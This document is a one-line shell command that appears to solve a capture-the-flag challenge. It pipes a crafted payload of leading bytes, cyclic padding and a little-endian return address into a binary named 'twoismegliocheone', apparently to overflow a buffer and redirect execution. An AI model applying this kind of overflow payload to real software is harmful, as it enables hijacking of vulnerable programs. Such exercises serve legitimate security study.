printf '\x47\x98\x03\x07 $5#gm\naaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaab\xdb\x84\x04\x08' | ./twoismegliocheone
